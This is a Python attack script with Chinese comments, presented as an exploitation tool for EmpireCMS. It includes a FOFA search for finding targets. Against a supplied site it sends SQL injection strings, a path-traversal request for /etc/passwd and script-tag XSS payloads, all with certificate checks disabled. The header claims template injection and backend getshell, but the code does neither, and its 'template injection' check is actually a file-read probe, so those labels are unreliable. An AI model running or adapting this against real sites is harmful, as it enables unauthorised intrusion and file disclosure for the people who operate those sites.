#!/usr/bin/env python3
"""
EmpireCMS 帝国软件 CMS 漏洞综合利用
- SQL注入: 前台搜索 / 标签参数
- 模板注入: DynamicTag 参数
- 后台getshell: 数据库备份路径可控
- XSS: WAP 模块输出未转义
- 影响: EmpireCMS 各版本
FOFA: app="EmpireCMS"
"""
import argparse, urllib.request, urllib.parse, ssl, sys

BANNER = """
  EmpireCMS 漏洞检测工具
  High | SQL注入 / 模板注入 / XSS / 后台RCE
  影响: EmpireCMS 各版本
"""

def check_fingerprint(target):
    """识别 EmpireCMS"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.urlopen(target.rstrip('/') + "/e/", timeout=8, context=ctx)
        html = req.read().decode('utf-8', errors='ignore')
        if "empire" in html.lower() or "帝国" in html:
            return True
    except:
        pass
    return False

def check_sqli(target):
    """EmpireCMS SQL注入检测"""
    print("\n[*] 检测 SQL 注入...")
    base = target.rstrip('/')
    # 搜索型注入
    search_paths = [
        "/e/search/index.php?keyboard=1&searchget=1&tbname=news&tempid=1",
        "/e/tags/?tagname=1",
        "/e/sch/index.php?keyboard=1",
    ]
    for path in search_paths:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            normal = base + path
            evil = base + path.replace("=1", "=1%27%20AND%201=1--")
            r1 = urllib.request.urlopen(normal, timeout=10, context=ctx)
            len1 = len(r1.read())
            r2 = urllib.request.urlopen(evil, timeout=10, context=ctx)
            len2 = len(r2.read())
            if len1 != len2:
                print(f"  [+] 候选注入: {path}")
                return True
        except:
            pass
    print("  [-] 未检测到明显 SQL 注入")
    return False

def check_template_injection(target):
    """模板注入检测"""
    print("\n[*] 检测模板注入...")
    base = target.rstrip('/')
    # DynamicTag 模板注入
    paths = [
        "/e/dojstab/?classid=1&path=../../../../etc/passwd",
        "/e/pl/more/index.php?tempid=1&aid=1&mid=1",
    ]
    for path in paths:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.urlopen(base + path, timeout=10, context=ctx)
            body = req.read().decode('utf-8', errors='ignore')
            if "root:" in body:
                print(f"  [+] 模板注入成功: {path}")
                return True
        except:
            pass
    print("  [-] 未检测到模板注入")
    return False

def check_xss(target):
    """XSS 检测"""
    print("\n[*] 检测 XSS...")
    base = target.rstrip('/')
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
    ]
    # WAP 模块
    for payload in xss_payloads:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            encoded = urllib.parse.quote(payload)
            url = base + f"/e/wap/?tempid=1&title={encoded}"
            req = urllib.request.urlopen(url, timeout=10, context=ctx)
            body = req.read().decode('utf-8', errors='ignore')
            if payload in body and "<script" in body:
                print(f"  [+] XSS 候选: {payload[:30]}")
                return True
            elif payload in body:
                print(f"  [?] 可能存在 XSS (未转义): {payload[:30]}")
        except:
            pass
    print("  [-] 未检测到明显 XSS")
    return False

def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("--check", action="store_true")
    parser.add_argument("--module", choices=["sqli", "tpl", "xss", "all"], default="all")
    args = parser.parse_args()

    target = args.target
    print(f"\n[*] 目标: {target}")

    if check_fingerprint(target):
        print("  [+] EmpireCMS 指纹确认")
    else:
        print("  [!] 未确认，继续...")

    if args.module in ("sqli", "all"):
        check_sqli(target)
    if args.module in ("tpl", "all"):
        check_template_injection(target)
    if args.module in ("xss", "all"):
        check_xss(target)

if __name__ == "__main__":
    main()
